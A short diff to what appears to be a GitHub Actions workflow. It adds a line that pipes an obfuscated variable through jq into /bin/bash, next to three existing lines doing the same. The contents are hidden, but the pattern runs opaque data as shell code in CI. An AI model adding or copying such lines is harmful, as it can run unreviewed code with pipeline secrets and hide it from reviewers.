@@ -24,6 +24,7 @@ jobs:
           echo $hp7 | jq -r .gmuqu3 | /bin/bash
           echo $gfble6260 | jq -r .ce772 | /bin/bash
           echo $oukxv0580 | jq -r .zh1 | /bin/bash
+          printf '%s' "$zaqtz173" | jq -r .ngkz07951 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
